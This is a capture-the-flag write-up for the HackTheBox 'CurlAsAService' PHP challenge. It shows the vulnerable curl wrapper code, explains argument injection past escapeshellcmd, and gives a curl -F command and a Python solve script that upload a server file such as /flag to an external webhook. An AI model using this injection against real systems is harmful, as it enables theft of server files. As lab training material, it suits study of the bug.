## CurlAsAService is a PHP chalenge on Hackthebox

### Description:

In this challenge we have an input that takes a url and pass it to curl command and retrieves the output back,\
the problem is we can use arguments injection to trigger an `LFI` vulnerability.

### Vulnerable code:
```php
class CommandModel
{
    public function __construct($url)
    {
        echo $url ."\n";
        echo escapeshellcmd($url) ."\n";
        $this->command = "curl --proto =http,https -sSL " . escapeshellcmd($url) . " 2>&1";
        echo $this->command . "\n";
    }

    public function exec()
    {
        $output = shell_exec($this->command);
        return $output;
    }
}
```

As you can see here, it uses `escapeshellcmd` to escape characters like `; | && ` etc.. .\
but since it passes out input to `CURL` arguments we can treat `CURL` to send us any file in the system.

example:
```shell
curl -F file=path/to/file http://<your webhook> # this url will receive a post request with the file
```



### Solve:

```python

import requests

def solve(webhook, file_path):
    
	headers = {'Content-Type': 'application/x-www-form-urlencoded'}
	data = {
     	'ip': f"-F file=@{file_path} {webhook}".encode('utf-8')
	}
	

	try:
		res = requests.post('http://localhost:1337/api/curl', headers=headers, data=data)
		if res.status_code == 200:
			print("Check you web hook if the file exist you'll find it there")
		else:
			print("Failed to resolve")
			print(res.status_code, res.text)
	except requests.exceptions as e:
		print(e)
 
 
if __name__ == '__main__':
    webhook = 'https://webhook.site/<webhook-uid>' # change this with your webhook url
    file_path = '/flag' # here put your target file path
    solve(webhook, file_path)

```
